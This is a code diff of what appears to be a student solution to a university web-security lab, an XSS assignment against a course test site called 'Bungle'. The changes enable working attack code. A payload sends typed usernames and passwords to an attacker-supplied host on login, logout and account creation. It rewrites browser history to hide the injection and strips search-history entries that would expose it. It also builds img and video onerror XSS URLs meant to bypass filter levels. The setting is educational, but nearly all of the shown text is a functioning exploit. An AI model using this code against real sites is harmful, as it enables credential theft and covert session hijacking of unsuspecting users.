@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<meta charset="utf-8">
-	<meta name="5961b3f">
+	<meta charset='utf-8'>
+	<meta name='5961b3f'>
 	<title>WebSec 2.2.3</title>
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script>
 <script>
 
 /*
@@ -69,26 +69,26 @@ function payload(attacker) {
 
             var target = `http://bungle-cs461.csl.illinois.edu/`;
 
-            function updateCurrentPage(newHtml, newTitle, newPage) {
+            function updatePage(newHtml, newTitle, newPage) {
                 
                 var oldState = {
-                    "html": $("html").html()
+                    'html': $('html').html()
                 };
-                console.log("Pushing Old State");
+                console.log('Pushing Old State');
                 window.history.pushState(oldState, newTitle, newPage);
 
-                $("html").html(newHtml);
+                $('html').html(newHtml);
                 var currentTitle = newTitle;
                 var currentPage = newPage;
                 var newState = {
-                    "html": $("html").html(),
-                    "title": currentTitle,
-                    "page": currentPage
+                    'html': $('html').html(),
+                    'title': currentTitle,
+                    'page': currentPage
                 };
-                console.log("Replacing with new State");
+                console.log('Replacing with new State');
                 window.history.replaceState(newState, currentTitle, currentPage);
-                $("title")[0].text = currentTitle;
-                console.log("Update Current Page");
+                $('title')[0].text = currentTitle;
+                console.log('Update Current Page');
                 inject();
                 // injectIntoPage();
                 // logPage();
@@ -96,221 +96,166 @@ function payload(attacker) {
 
             function updateHistory() {
                 var stateDict = {
-                    "html": $("body").html(),
-                    "title": "currentTitle",
-                    "page": "currentPage"
+                    'html': $('body').html(),
+                    'title': 'currentTitle',
+                    'page': 'currentPage'
                 }
-                window.history.pushState(stateDict, "currentTitle", "currentPage");
+                window.history.pushState(stateDict, 'currentTitle', 'currentPage');
             }
             
             function log(data) {
                 console.log($.param(data))
                 $.get(attacker, data);
-                // console.log("test");
+                // console.log('test');
             }
 
             var first = true;
             
             function inject(){
-                console.log("Original Page");
+                console.log('Original Page');
                 
                 if(first){
-                    console.log("Reset URL");
+                    console.log('Reset URL');
                     var stateDict = {
-                    "html": $("html").html(),
-                    "title": "NOT Bungle!",
-                    "page": ""
+                    'html': $('html').html(),
+                    'title': 'NOT Bungle!',
+                    'page': ''
                     };
-                    window.history.replaceState(stateDict, "NOT Bungle!", target);
+                    window.history.replaceState(stateDict, 'NOT Bungle!', target);
                     first = false;
                 }
 
 
-                $("title", window.parent.document).text("NOT Bungle!");
+                $('title', window.parent.document).text('NOT Bungle!');
 
-                $(".form-inline").attr("onsubmit", "return false");
+                $('.form-inline').attr('onsubmit', 'return false');
+
+                log({event: 'nav', user: $('html').contents().find('#logged-in-user').text(), url:'./'});
 
                 // LOG IN BUTTON
-                $("html").contents().find("#log-in-btn").click(function(event){
-                    console.log("Log in attempted");
-                    // $("head title", window.parent.document).text("NOT Bungle!");
-                    // history.pushState(null, null, target);
-                    var usern=$("html").contents().find("#username").val();
-                    var passw=$("html").contents().find("#userpass").val();
+                $('html').contents().find('#log-in-btn').click(function(event){
+                    console.log('Log in attempted');
+                    var usern=$('html').contents().find('#username').val();
+                    var passw=$('html').contents().find('#userpass').val();
+                    log({event: 'login', user: usern, pass: passw});
                     
                     $.post(
-                        "http://bungle-cs461.csl.illinois.edu/login",
+                        'http://bungle-cs461.csl.illinois.edu/login',
                         {
                             username: usern,
                             password: passw
                         }
                     )
                     .done(function(data){
-                        updateCurrentPage(data, "NOT Bungle!", "./");
-                        console.log("Update curr page");
+                        updatePage(data, 'NOT Bungle!', './');
+                        console.log('Update curr page');
                         return false;
                     });
                 });
 
                 // LOG OUT BUTTON
-                $("html").contents().find("#log-out-btn").click(function(event){
-                    console.log("Logout attempted");
-                    // $("head title", window.parent.document).text("Bungle!");
+                $('html').contents().find('#log-out-btn').click(function(event){
+                    console.log('Logout attempted');
                     
-                    var usern=$("#html").contents().find("#username").val();
-                    var passw=$("#html").contents().find("#userpass").val();
-                    // log({event: "login", user: usern, pass: passw});
-                    $.post("./logout")
+                    var usern=$('html').contents().find('#username').val();
+                    var passw=$('html').contents().find('#userpass').val();
+                    log({event: 'logout', user: usern, pass: passw});
+                    
+                    $.post('./logout')
                     .done(function(data) {
-                        // log({event: "logout", user: currentUser});
-                        currentUser = ""
-                        // updateHistory();
-                        // $("html").html(data);
-                        // history.pushState({"html" : data}, null, target);
-                        updateCurrentPage(data, "NOT Bungle!", "./");
+                        updatePage(data, 'NOT Bungle!', './');
                         return false;
                     });
                 });
 
                 // NEW ACCOUNT BUTTON
-                $("html").contents().find("#new-account-btn").click(function(event){
-					$("head title", window.parent.document).text("Bungle!");
+                $('html').contents().find('#new-account-btn').click(function(event){
+					$('head title', window.parent.document).text('Bungle!');
 					// history.pushState(null, null, target);
-					var usern=$("html").contents().find("#username").val();
-					var passw=$("html").contents().find("#userpass").val();
-					// log({event: "login", user: usern, pass: passw});
+					var usern=$('html').contents().find('#username').val();
+					var passw=$('html').contents().find('#userpass').val();
+
+					log({event: 'login', user: usern, pass: passw});
 
                     $.post(
-                        "http://bungle-cs461.csl.illinois.edu/create",
+                        'http://bungle-cs461.csl.illinois.edu/create',
                         {
                             username: usern,
                             password: passw
                         }
                     )
                     .done(function(data) {
-                        // currentUser = usernameField.value
-                        // log({event: "login", user: currentUser, pass: userpassField.value});
-                        // updateHistory();
-                        updateCurrentPage(data, "Bungle!", "./");
+                        updatePage(data, 'Bungle!', './');
                         return false;
                     })
 				});
 
                 //BUNGLE BUTTON
-                $("html").contents().find("#bungle-lnk").click(function(event){
-                    $("html").contents().find("#bungle-lnk").removeAttr("href");
-                    // history.pushState(null, null, target);
-                    $.get("./")
+                $('html').contents().find('#bungle-lnk').click(function(event){
+                    $('html').contents().find('#bungle-lnk').removeAttr('href');
+
+                    $.get('./')
                     .done(function(data) {
                         // updateHistory();
-                        updateCurrentPage(data, "NOT Bungle!", "./");
+                        updatePage(data, 'NOT Bungle!', './');
                         return false;
                     });
                 });
 
                 // SEARCH BUTTON
-                $("html").contents().find("#search-btn").click(function(event){
-					// $("head title", window.parent.document).text("Search Results");
-					var q=$("html").contents().find("#query").val();
-					var new_target="http://bungle-cs461.csl.illinois.edu/search?q="+q
-					// history.pushState(null, null, new_target);
-					// log({event: "nav", user: $("#fake_page").contents().find("#logged-in-user").text(), url:new_target});
+                $('html').contents().find('#search-btn').click(function(event){
+					// $('head title', window.parent.document).text('Search Results');
+					var q=$('html').contents().find('#query').val();
+					var new_target='http://bungle-cs461.csl.illinois.edu/search?q='+q
                     $.get(new_target)
                     .done(function(data) {
                         // updateHistory();
-                        updateCurrentPage(data, "Search Results", new_target);
+                        updatePage(data, 'Search Results', new_target);
                         return false;
                     });
 				});
 
                 // SEARCH AGAIN BUTTON
-                $("html").contents().find("#search-again-btn").click(function(event){
-                    $("html").contents().find("#search-again-btn").removeAttr("href");
-					// $("head title", window.parent.document).text("Search Results");
-					// var q=$("html").contents().find("#query").val();
-					// var new_target="http://bungle-cs461.csl.illinois.edu/search?q="+q
-					// history.pushState(null, null, target);
-					// log({event: "nav", user: $("#fake_page").contents().find("#logged-in-user").text(), url:new_target});
-                    $.get("./")
+                $('html').contents().find('#search-again-btn').click(function(event){
+                    $('html').contents().find('#search-again-btn').removeAttr('href');
+                    $.get('./')
                     .done(function(data) {
                         // updateHistory();
-                        updateCurrentPage(data, "Search Results", "./");
+                        updatePage(data, 'Search Results', './');
                         return false;
                     });
 				});
 
                 // SEARCH HISTORY
-                $.each($(".history-item"), function() {
-                    $(".history-item").removeAttr("href");
+                $.each($('.history-item'), function() {
+                    $('.history-item').removeAttr('href');
                     $(this).click(function() {
-                        var urlS = "./search?q=" + this.text;
+                        var urlS = './search?q=' + this.text;
                         $.get(urlS)
                         .done(function(data) {
-                            // history.pushState({"html" : $.parseHTML(data)}, null, urlS);
-                            updateCurrentPage(data, "Search Results", urlS);
+                            // history.pushState({'html' : $.parseHTML(data)}, null, urlS);
+                            updatePage(data, 'Search Results', urlS);
                             return false;
                         });
                     });
                     // console.log(this.text);
-                    if (this.text.includes("payload(attacker)") || this.text.includes("fromCharCode(102")) {
+                    if (this.text.includes('payload(attacker)')) {
                         this.remove();
                     }
                 });
-                
-
             }
-
-
-                                    // proxy("./login", attacker);
-            // var loginButton = $("#log-in-btn");
-            // var createAccountButton = $("#new-account-btn");
-
-            // var usernameField = $("#username")[0];
-            // var userpassField = $("#userpass")[0];
-
-            // $(".form-inline").attr("onsubmit", "return false");
-
-            // /* login button */
-            // if (loginButton) {
-            //     loginButton.click(function() {
-            //         if (usernameField.value && userpassField.value) {
-            //             console.log("attempt login");
-
-            //             $.post(
-            //                 "http://bungle-cs461.csl.illinois.edu/login",
-            //                 {
-            //                     username: usernameField.value,
-            //                     password: userpassField.value
-            //                 }
-            //             )
-            //             .done(function(data) {
-            //                 currentUser = usernameField.value
-            //                 log({event: "login", user: currentUser, pass: userpassField.value});
-            //                 // updateHistory();
-            //                 updateCurrentPage(data, "Bungle!", "./");
-            //                 return false;
-            //             })
-            //             .fail(function (jqXHR, textStatus, error) {
-            //                 // updateHistory();
-            //                 textStatus = textStatus.charAt(0).toUpperCase() + textStatus.slice(1)
-            //                 var newTitle = textStatus + ": " + jqXHR.status + " " + error;
-            //                 updateCurrentPage(jqXHR.responseText, newTitle, "./login");
-            //                 return false;
-            //             });
-            //         }
-            //     });
-            // }
-                inject();
+            inject();
             // Show new HTML
             $('html').show();
 
             // TODO implement spying while being stealthy and persistent. Remove the alert.
-            // alert("Notice that although we injected code into the search page, you see here the main page!")
+            // alert('Notice that although we injected code into the search page, you see here the main page!')
 
         });
+        
     }
     //Call Proxy
-	proxy('./', attacker)
+	proxy('./', attacker);
 }
 
 function makeLink(target, attacker, defense) {
@@ -352,16 +297,20 @@ function makeLink(target, attacker, defense) {
             // TODO: generate XSS URL payload for defense level 2.2.3.4
             return target + "/search?xssdefense=" + (defense-2) + "&q=" +
                 encodeURIComponent(
-                    "<img src='#' onerror=\'" +
-                    payload_string +
-                    ";payload(\"" + attacker + "\");\'>");
+                    "<img src='gg.jpeg' onerror=\"" +
+                    payload_string + 
+                    "; payload('" + attacker + "');\"" + 
+                    ">"
+                );
         case 5:
             // TODO: generate XSS URL payload for defense level 2.2.3.5
             return target + "/search?xssdefense=" + (defense-2) + "&q=" +
                 encodeURIComponent(
-                    "<video src='#' onerror=\'" +
-                    payload_string +
-                    ";payload(\"" + attacker + "\");\'>");
+                    "<video src='gg.mov' onerror=\"" +
+                    payload_string + 
+                    "; payload('" + attacker + "');\"" + 
+                    ">"
+                );
         case 6:
             // TODO: generate XSS URL payload for defense level 2.2.3.6
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
